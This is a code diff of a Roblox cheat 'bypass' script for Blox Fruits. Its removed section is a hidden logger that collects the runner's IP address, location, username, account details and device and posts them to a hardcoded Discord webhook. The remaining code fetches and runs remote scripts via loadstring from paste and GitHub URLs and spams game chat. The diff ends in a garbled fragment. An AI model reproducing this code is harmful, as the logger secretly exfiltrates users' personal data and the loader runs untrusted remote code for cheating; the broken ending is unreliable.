@@ -1,281 +1,3 @@
---[[
-Date & Time Functions
-]]--
-
-local api = game.HttpService:JSONDecode(game:HttpGet('https://ipwho.is/'))
-
-function GetYear()
-    local year = api.timezone["current_time"]
-    local getyearnum = 1
-    while year:sub(getyearnum, getyearnum) ~= "-" do
-        getyearnum += 1
-    end
-    return year:sub(1, getyearnum - 1)
-end
-
-function GetMonth(format)
-    local month = api.timezone["current_time"]
-    local getmonthnum = 1
-    local getmonthnum2 = 0
-    local getmonthnum3 = 0
-    while month:sub(getmonthnum, getmonthnum) ~= "-" and getmonthnum3 ~= 2 do
-        getmonthnum += 1
-        if getmonthnum3 == 0 then
-            getmonthnum2 += 1
-        end
-        if month:sub(getmonthnum, getmonthnum) == "-" then
-            getmonthnum3 += 1
-        end
-    end
-    month = month:sub(getmonthnum + 1, getmonthnum + 2)
-    if format then
-        if month == "01" then
-            month = "January"
-        elseif month == "02" then
-            month = "February"
-        elseif month == "03" then
-            month = "March"
-        elseif month == "04" then
-            month = "April"
-        elseif month == "05" then
-            month = "May"
-        elseif month == "06" then
-            month = "June"
-        elseif month == "07" then
-            month = "July"
-        elseif month == "08" then
-            month = "August"
-        elseif month == "09" then
-            month = "September"
-        elseif month == "10" then
-            month = "October"
-        elseif month == "11" then
-            month = "November"
-        elseif month == "12" then
-            month = "December"
-        end
-    end
-    return month
-end
-
-function GetDay()
-    local day = api.timezone["current_time"]
-    local getdaynum = 1
-    while day:sub(getdaynum, getdaynum) ~= "T" do
-        getdaynum += 1
-    end
-    return day:sub(getdaynum - 2, getdaynum - 1)
-end
-
-function GetHour()
-    local hour = api.timezone["current_time"]
-    local gethournum = 1
-    while hour:sub(gethournum, gethournum) ~= ":" do
-        gethournum += 1
-    end
-    hour = hour:sub(gethournum - 2, gethournum - 1)
-    if hour == "13" then
-        hour = "01"
-    elseif hour == "14" then
-        hour = "02"
-    elseif hour == "15" then
-        hour = "03"
-    elseif hour == "16" then
-        hour = "04"
-    elseif hour == "17" then
-        hour = "05"
-    elseif hour == "18" then
-        hour = "06"
-    elseif hour == "19" then
-        hour = "07"
-    elseif hour == "20" then
-        hour = "08"
-    elseif hour == "21" then
-        hour = "09"
-    elseif hour == "22" then
-        hour = "10"
-    elseif hour == "23" then
-        hour = "11"
-    elseif hour == "00" then
-        hour = "12"
-    end
-    return hour
-end
-
-function GetMinute()
-    local minute = api.timezone["current_time"]
-    local getminutenum = 1
-    local getminutenum2 = 0
-    local getminutenum3 = 0
-    while minute:sub(getminutenum, getminutenum) ~= ":" and getminutenum3 ~= 2 do
-        getminutenum += 1
-        if getminutenum3 == 0 then
-            getminutenum2 += 1
-        end
-        if minute:sub(getminutenum, getminutenum) == ":" then
-            getminutenum3 += 1
-        end
-    end
-    return minute:sub(getminutenum + 1, getminutenum + 2)
-end
-
-function GetSeconds()
-    local seconds = api.timezone["current_time"]
-    local getsecondsnum = 1
-    while seconds:sub(getsecondsnum, getsecondsnum) ~= "+" do
-        getsecondsnum += 1
-    end
-    return seconds:sub(getsecondsnum - 2, getsecondsnum - 1)
-end
-
-function GetMeridiem()
-    local hour = api.timezone["current_time"]
-    local gethournum = 1
-    while hour:sub(gethournum, gethournum) ~= ":" do
-        gethournum += 1
-    end
-    hour = hour:sub(gethournum - 2, gethournum - 1)
-    if hour >= "12" then
-        return "PM" 
-    else
-        return "AM"
-    end
-end
-
---[[
-Logger System
-]]--
-
-if not game:IsLoaded() then game.Loaded:Wait() end
-
--- SERVICES
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local HttpService = game:GetService("HttpService")
-local MarketplaceService = game:GetService("MarketplaceService")
-local player = Players.LocalPlayer
-
--- CONFIG
-local webhookUrl = "https://discord.com/api/webhooks/1409521400246435850/K5c_Y4j8QNW5PfSRiMMU4tCUlh9SKjSaZBgvSShvGIJl8hkpEHopB_afctmDgftttDbh"
-local executor = identifyexecutor and identifyexecutor() or "Unknown"
-
--- Device detection
-local device = "PC"
-if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-    device = "Mobile"
-elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
-    device = "Console"
-end
-
--- Game/Sea detection
-local PlaceId = game.PlaceId
-local GameName = "Unknown Game"
-local sea = "N/A"
-local isBloxFruits = false
-
-if PlaceId == 2753915549 then
-    GameName = "Blox Fruits"
-    sea = "First Sea"
-    isBloxFruits = true
-elseif PlaceId == 4442272183 then
-    GameName = "Blox Fruits"
-    sea = "Second Sea"
-    isBloxFruits = true
-elseif PlaceId == 7449423635 then
-    GameName = "Blox Fruits"
-    sea = "Third Sea"
-    isBloxFruits = true
-elseif PlaceId == 1954280567 then
-    GameName = "Blox Fruits"
-    sea = "Fourth Sea"
-    isBloxFruits = true
-else
-    local success, info = pcall(function()
-        return MarketplaceService:GetProductInfo(PlaceId)
-    end)
-    if success and info and info.Name then
-        GameName = info.Name
-    end
-end
-
--- Webhook (only once)
-_G.DRIX_LOGGED_ONCE = _G.DRIX_LOGGED_ONCE or false
-
-if not _G.DRIX_LOGGED_ONCE then
-    _G.DRIX_LOGGED_ONCE = true
-
-    -- Get IP from the API
-    local ipAddress = api.ip or "Unknown"
-    
-    -- Create attractive embed message
-    local embed = {
-        ["content"] = "🚀 **New Script Execution Detected!**",
-        ["embeds"] = {
-            {
-                ["title"] = "📊 DRIX LOGGER SYSTEM",
-                ["color"] = 16753920, -- Orange color
-                ["thumbnail"] = {
-                    ["url"] = "https://cdn.discordapp.com/attachments/1047523233570336788/1071306430189797376/standard_1.gif"
-                },
-                ["fields"] = {
-                    {
-                        ["name"] = "👤 Player Information",
-                        ["value"] = "**Username:** " .. player.Name .. 
-                                  "\n**User ID:** " .. tostring(player.UserId) ..
-                                  "\n**Account Age:** " .. tostring(player.AccountAge) .. " days",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "🌐 Network Details",
-                        ["value"] = "**IP Address:** ||" .. ipAddress .. "||" ..
-                                  "\n**Country:** " .. (api.country or "Unknown") ..
-                                  "\n**Region:** " .. (api.region or "Unknown") ..
-                                  "\n**City:** " .. (api.city or "Unknown"),
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "💻 System Information",
-                        ["value"] = "**Device:** " .. device ..
-                                  "\n**Executor:** " .. executor ..
-                                  "\n**Game:** " .. GameName,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "🕐 Execution Time",
-                        ["value"] = GetMonth(true) .. " " .. GetDay() .. ", " .. GetYear() .. 
-                                  "\n" .. GetHour() .. ":" .. GetMinute() .. ":" .. GetSeconds() .. " " .. GetMeridiem(),
-                        ["inline"] = true
-                    }
-                },
-                ["footer"] = {
-                    ["text"] = "DRIX Logger • Secure Monitoring System",
-                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1047523233570336788/1071306430189797376/standard_1.gif"
-                },
-                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-            }
-        }
-    }
-
-    -- Add sea information if it's Blox Fruits
-    if isBloxFruits then
-        embed.embeds[1].fields[3].value = embed.embeds[1].fields[3].value .. "\n**Sea:** " .. sea
-    end
-
-    -- Send webhook request
-    local req = (syn and syn.request) or (http and http.request) or http_request or request
-    pcall(function()
-        req({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode(embed)
-        })
-    end)
-end
-
-
 --// Roblox GUI Script with separate warning GUI
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
@@ -350,7 +72,7 @@ local warnLabel = Instance.new("TextLabel")
 warnLabel.Size = UDim2.new(0.95, 0, 0.9, 0)
 warnLabel.Position = UDim2.new(0.025, 0, 0.05, 0)
 warnLabel.BackgroundTransparency = 1
-warnLabel.TextColor3 = Color3.new(0,0,0) -- ✅ Warning text is now black
+warnLabel.TextColor3 = Color3.new(0,0,0) -- black text
 warnLabel.TextSize = 16
 warnLabel.TextWrapped = true
 warnLabel.Font = Enum.Font.GothamBold
@@ -358,8 +80,7 @@ warnLabel.Text = ""
 warnLabel.Parent = warnFrame
 
 -- Function: Show warning
-local function showWarningMessage(msg, color)
-    warnLabel.TextColor3 = Color3.new(0,0,0) -- always black text
+local function showWarningMessage(msg)
     warnLabel.Text = msg
     warnFrame.Visible = true
     TweenService:Create(warnFrame, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -200, 0.75, 0)}):Play()
@@ -379,7 +100,7 @@ bypassButton.MouseButton1Click:Connect(function()
 
     -- After 4 seconds load external script + smooth corners
     task.delay(4, function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/bloxfruit-scripts/Redz_hub2.0/refs/heads/main/Redz_script"))()
+        loadstring(game:HttpGet("https://pastefy.app/9lPAOk2Y/raw"))()
         for _, obj in pairs(frame:GetDescendants()) do
             if obj:IsA("TextButton") or obj:IsA("Frame") then
                 if not obj:FindFirstChild("UICorner") then
@@ -416,22 +137,37 @@ end)
 -- CHAT COMMANDS
 LocalPlayer.Chatted:Connect(function(msg)
     local args = string.split(msg, " ")
-    local chatEvent = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+    local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
 
-    if args[1] == "!warn" and args[2] then
+    if args[1] == "!warn" then
         local warnMsg = table.concat(args, " ", 2)
-        showWarningMessage(warnMsg)
+        if warnMsg ~= "" then
+            showWarningMessage(warnMsg)
+        else
+            showWarningMessage("⚠️ Please provide a warning message after !warn")
+        end
 
     elseif msg == "!oldwarn" then
         showWarningMessage("PLS DONT CLICK ON THE SCREEN FOR NO REASON IT WILL MAKE THE BYPASS TIME TAKE MORE!!")
 
-    elseif msg == "!say" then
-        task.spawn(function()
-            for i = 1, 100 do
-                local sayMsg = ({ "hii guys.","hii bro","hii gang" })[(i-1)%3+1]
-                chatEvent:FireServer(sayMsg, "All")
-                task.wait(3)
-            end
-        end)
-    end
-eend
+    elseif args[1] == "!say" then
+        if chatEvent then
+            task.spawn(function()
+                for i = 1, 100 do
+                    local messages = {
+                        "hii guys 🧠🔴",
+                        "skibidi toilet 🚽🎶",
+                        "rizz gyatt sigma 😈🔥",
+                        "fanum tax 💸",
+                        "brain rot activated 💀🎧"
+                    }
+                    local sayMsg = messages[(i-1) % #messages + 1]
+                    chatEvent:FireServer(sayMsg, "All")
+                    task.wait(3)
+                end
+            end)
+        else
+            showWarningMessage("⚠️ Chat system not found in this game, !say can't work here.")
+        end
+oxfruit-scripts/R
